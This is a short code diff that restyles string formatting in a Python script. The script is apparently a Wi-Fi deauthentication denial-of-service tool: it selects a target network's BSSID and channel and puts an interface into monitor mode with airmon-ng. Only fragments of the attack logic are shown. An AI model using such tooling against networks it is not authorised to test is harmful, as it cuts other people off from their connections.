@@ -56,7 +56,7 @@ print("\n****************************************************************")
 
 
 # If the user doesn't run the program with super user privileges, don't allow them to continue.
-if not 'SUDO_UID' in os.environ.keys():
+if 'SUDO_UID' not in os.environ.keys():
     print("Try running this program with sudo.")
     exit()
 
@@ -70,13 +70,13 @@ for file_name in os.listdir():
         directory = os.getcwd()
         try:
             # We make a new directory called /backup
-            os.mkdir(directory + "/backup/")
+            os.mkdir(f'{directory}/backup/')
         except:
             print("Backup folder exists.")
         # Create a timestamp
         timestamp = datetime.now()
         # We move any .csv files in the folder to the backup folder.
-        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
+        shutil.move(file_name, f'{directory}/backup/{str(timestamp)}-{file_name}')
 
 # Regex to find wireless interfaces. We're making the assumption they will all be wlan0 or higher.
 wlan_pattern = re.compile("^wlan[0-9]+")
@@ -188,8 +188,8 @@ hackbssid = active_wireless_networks[int(choice)]["BSSID"]
 hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
 # Change to the channel we want to perform the DOS attack on. 
-# Monitoring takes place on a different channel and we need to set it to that channel. 
-subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
+# Monitoring takes place on a different channel and we need to set it to that channel.
+subprocess.run(["airmon-ng", "start", f'{hacknic}mon', hackchannel])
 
 # Deauthenticate clients using a subprocess. 
 # The script is the parent process and creates a child process which runs the system command, 
